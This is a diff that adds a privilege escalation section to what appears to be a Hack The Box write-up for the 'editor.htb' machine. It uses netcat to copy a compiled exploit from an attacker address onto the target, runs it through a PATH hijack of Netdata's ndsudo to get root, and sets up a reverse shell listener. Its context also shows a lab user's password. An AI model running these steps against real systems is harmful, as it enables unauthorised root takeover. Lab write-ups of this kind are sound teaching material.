@@ -79,4 +79,47 @@ ssh -4 oliver@editor.htb
 * User: `oliver`
 * Password: `theEd1t0rTeam99`
 
----
+## 5. Privilege Escalation
+
+### 5.1 Compiling the exploit
+
+On your local machine, compile the exploit statically to avoid library dependencies on the target:
+
+```bash
+x86_64-linux-gnu-gcc -o nvme exploit.c -static
+```
+
+### 5.2 Transfer the exploit to the target
+
+Use `nc` (netcat) to send the compiled binary to the target machine:
+
+On your **local machine** (sending the file):
+
+```bash
+nc -lvnp 4444 < nvme
+```
+
+On the **target machine** (receiving the file):
+
+```bash
+nc 10.10.14.8 4444 > nvme
+chmod +x nvme
+```
+
+### 5.3 Execute the exploit with appropriate permissions
+
+Run the exploit by adding the current directory to the `PATH` and using `ndsudo` to escalate privileges:
+
+```bash
+PATH=$(pwd):$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
+```
+
+### 5.4 Listen on the reverse shell port
+
+Meanwhile, on your **local machine**, listen for a reverse shell on port `9001` (or the port specified by the exploit):
+
+```bash
+nc -lvnp 9001
+```
+And now you have the root flag.
+
